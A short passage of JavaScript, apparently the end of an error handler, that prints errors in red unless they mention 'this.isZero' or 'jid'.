    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
